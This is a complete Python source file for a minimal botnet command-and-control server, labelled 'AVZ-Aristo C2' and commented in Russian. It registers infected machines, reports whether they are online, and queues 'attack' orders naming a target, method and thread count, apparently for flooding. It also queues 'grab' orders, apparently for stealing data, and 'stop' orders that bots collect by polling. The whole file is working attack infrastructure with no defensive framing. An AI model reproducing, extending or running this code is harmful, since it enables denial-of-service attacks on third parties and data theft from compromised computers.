#!/usr/bin/env python3
# AVZ-Aristo C2 – сверхминимальный, без внешних зависимостей
import asyncio, json, os, time
from datetime import datetime

HTTP_PORT = 80
BOTS_FILE = "bots.json"
COMMANDS_FILE = "commands.json"

bots = {}
if os.path.exists(BOTS_FILE):
    with open(BOTS_FILE) as f:
        bots = json.load(f)

commands_queue = {}
if os.path.exists(COMMANDS_FILE):
    with open(COMMANDS_FILE) as f:
        commands_queue = json.load(f)

def save_bots():
    with open(BOTS_FILE, "w") as f:
        json.dump(bots, f, indent=2)

def save_commands():
    with open(COMMANDS_FILE, "w") as f:
        json.dump(commands_queue, f, indent=2)

async def handle_client(reader, writer):
    ip = writer.get_extra_info('peername')[0]
    try:
        data = await asyncio.wait_for(reader.read(4096), timeout=5)
    except:
        writer.close()
        return
    msg = data.decode('utf-8', errors='replace').strip()
    print(f"[TCP:{ip}] {msg[:200]}")

    if msg == "list":
        now = datetime.now()
        bots_list = []
        for bot_ip, bot in bots.items():
            last_seen = datetime.strptime(bot["last_seen"], "%Y-%m-%d %H:%M:%S")
            bot["status"] = "online" if (now - last_seen).total_seconds() < 30 else "offline"
            bots_list.append(bot)
        writer.write(json.dumps(bots_list).encode())
    elif msg.startswith("attack:"):
        parts = msg.split(":", 1)[1].split("|")
        if len(parts) >= 3:
            target, method, threads = parts[0], parts[1], parts[2]
            bot_ips = parts[3].split(",") if len(parts) > 3 else list(bots.keys())
            for bot_ip in bot_ips:
                commands_queue.setdefault(bot_ip, []).append(
                    {"type": "attack", "target": target, "method": method, "threads": int(threads)})
            save_commands()
            writer.write(b"commands queued")
        else:
            writer.write(b"invalid format")
    elif msg.startswith("grab:"):
        bot_ips = msg.split(":", 1)[1].split(",") if ":" in msg else list(bots.keys())
        for bot_ip in bot_ips:
            commands_queue.setdefault(bot_ip, []).append({"type": "grab"})
        save_commands()
        writer.write(b"grab queued")
    elif msg.startswith("stop:"):
        bot_ips = msg.split(":", 1)[1].split(",") if ":" in msg else list(bots.keys())
        for bot_ip in bot_ips:
            commands_queue.setdefault(bot_ip, []).append({"type": "stop"})
        save_commands()
        writer.write(b"stop queued")
    elif msg == "ping":
        if ip in commands_queue and commands_queue[ip]:
            pending = commands_queue.pop(ip)
            save_commands()
            writer.write(json.dumps(pending).encode())
        else:
            writer.write(b"no commands")
        if ip in bots:
            bots[ip]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            bots[ip]["status"] = "online"
            save_bots()
    else:
        # Регистрация нового бота
        info = {}
        try:
            data = json.loads(msg)
            if isinstance(data, dict) and data.get("type") == "register":
                info = data.get("data", {})
            else:
                info = data
        except:
            pass
        hostname = info.get("hostname", "")
        os_info = info.get("os", "")
        cpu = info.get("cpu", "")
        ram = info.get("ram", "")
        is_new = ip not in bots
        bots[ip] = {
            "ip": ip,
            "hostname": hostname,
            "os": os_info,
            "cpu": cpu,
            "ram": ram,
            "status": "online",
            "rps": 0,
            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_bots()
        if is_new:
            # Можно добавить уведомление в Telegram, но сейчас для простоты пропущено
            pass
        writer.write(b"registered")
    await writer.drain()
    writer.close()

async def main():
    server = await asyncio.start_server(handle_client, '0.0.0.0', HTTP_PORT)
    print(f"[+] C2 (чистый asyncio) слушает порт {HTTP_PORT}")
    async with server:
        await server.serve_forever()

if __name__ == "__main__":
    asyncio.run(main())